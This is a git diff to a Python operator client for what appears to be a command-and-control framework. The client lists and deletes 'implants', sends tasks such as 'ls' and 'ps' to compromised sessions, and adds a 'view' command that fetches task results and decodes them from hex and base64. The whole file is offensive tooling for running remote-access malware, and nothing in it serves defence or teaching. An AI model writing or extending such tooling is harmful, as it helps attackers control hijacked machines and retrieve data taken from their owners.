@@ -1,6 +1,8 @@
 #!/usr/bin/python3
 import httpx
 import shlex
+import base64 
+import binascii
 
 from prettytable import PrettyTable
 
@@ -44,6 +46,51 @@ cmds_session = WordCompleter(
     ]
 )
 
+def format_output(output: str):
+    try:
+        decoded_bytes = bytes.fromhex(output)
+        decoded_base = base64.b64decode(decoded_bytes.decode('utf-8')).decode('utf-8')
+        return decoded_base
+    except (binascii.Error, UnicodeDecodeError, ValueError) as e:
+        print_formatted_text(f"[*] Error decoding output: {e}")
+
+
+def get_result(token: str, server: str, session: str, id: int):
+    url = f"http://{server}/results/{session}/{id}"
+    headers = {
+        'accept': 'application/json',
+        'Authorization': f'Bearer {token}',
+    }
+    
+    response = httpx.get(url, headers=headers)
+    if response.status_code == 404:
+        print_formatted_text(f"[*] Session id {session} not found!")
+    elif response.status_code == 416:
+        print_formatted_text(f"[*] ID {id} not found for session {session}")
+    elif response.status_code == 401 and response.json().get("detail") == "Bad Credentials":
+        print_formatted_text("[*] Invalid token...time to reauthenticate")
+        return
+    elif response.status_code == 200:
+        result = response.json()
+        table = PrettyTable()
+        table.field_names = ["ID", "Session", "Date Received", "Task", "Args"]
+        id = result.get("id")
+        session_id = result.get("session")
+        date_received = result.get("date", "Null")
+        if date_received != "Null":
+            date_received_formatted = fix_date(date_received)
+        else:
+            date_received_formatted = "Null"
+        task = result.get("task", "Null")
+        args = result.get("args", "Null")
+        table.add_row([id, session_id, date_received_formatted, task, args])
+        print_formatted_text(table)
+        output = result.get("results", "Null")
+        print_formatted_text(format_output(output))
+    else:
+        print_formatted_text(response.status_code, response.text, response)
+        return
+
 def format_sessions(sessions: list):
     if isinstance(sessions, list):
         table = PrettyTable()
@@ -73,15 +120,15 @@ def get_sessions(token: str, server: str):
         'Authorization': f'Bearer {token}',
     }
     response = httpx.get(url, headers=headers)
-
-    if response.status_code != 200:
-        print_formatted_text(response.status_code, response.text, response)
-
-    if isinstance(response.json(), list):
+    if response.status_code == 401 and response.json().get("detail") == "Bad Credentials":
+        print_formatted_text("[*] Invalid token...time to reauthenticate")
+        return
+    elif response.status_code == 200 and isinstance(response.json(), list):
         # proper json array
         format_sessions(response.json())
     else:
         print_formatted_text("[*] Invalid data format")
+        print_formatted_text(response.status_code, response.text, response)
         return
 
     
@@ -124,7 +171,11 @@ def get_session(token: str, server: str, session: str):
         print_formatted_text(table)
     elif response.status_code == 404:
         print_formatted_text(f"[*] Session id {session} not found!")
-    else: print_formatted_text(response.status_code, response.text, response)
+    elif response.status_code == 401 and response.json().get("detail") == "Bad Credentials":
+        print_formatted_text("[*] Invalid token...time to reauthenticate")
+        return
+    else: 
+        print_formatted_text(response.status_code, response.text, response)
     return response.status_code
 
 
@@ -140,6 +191,9 @@ def delete_implant(token: str, server: str, session: str):
         session_id = json_data.get("session")
         if session_id == session:
             print_formatted_text(f"[*] Session id {session} deleted")
+    elif response.status_code == 401 and response.json().get("detail") == "Bad Credentials":
+        print_formatted_text("[*] Invalid token...time to reauthenticate")
+        return
     elif response.status_code == 404:
         print_formatted_text(f"[*] Session id {session} not found!")
     else: print_formatted_text(response.status_code, response.text, response)
@@ -175,7 +229,14 @@ def session_router(cmd: str, args: list, token: str, server: str, session_id: st
     elif cmd == "ls":
         if len(args) == 1:
             send_task(token, server, session_id, "ls", args[0])
+        else:
+            send_task(token, server, session_id, "ls", "")
     elif cmd == "tasking":
         get_tasking(token, session_id, server)
     elif cmd == "ps":
         send_task(token, server, session_id, "ps", "")
+    elif cmd == "view":
+        if len(args) == 1:
+            get_result(token, server, session_id, int(args[0]))
+        else:
+            print_formatted_text("[*] Expecting task id -> view <task-id>")
